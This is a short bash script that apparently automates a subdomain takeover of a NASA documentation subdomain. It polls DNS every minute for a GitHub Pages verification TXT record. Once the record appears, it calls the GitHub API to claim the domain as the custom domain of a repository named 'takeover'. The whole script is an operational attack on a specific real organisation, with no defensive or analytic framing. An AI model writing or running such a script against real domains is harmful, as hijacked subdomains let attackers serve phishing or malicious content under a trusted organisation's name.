#!/usr/bin/env bash
D=docs.dev.fornax.sciencecloud.nasa.gov
T=_github-pages-challenge-Darshan060224.$D
for i in $(seq 1 1440); do
  v=$(dig +short TXT "$T" @8.8.8.8)
  if [ -n "$v" ]; then
    echo "[$(date +%T)] TXT appeared: $v"
    gh api -X PUT "repos/Darshan060224/takeover/pages" -f "cname=$D" && echo CLAIM SUBMITTED
    exit 0
  fi
  sleep 60
done
echo "no TXT after 24h"
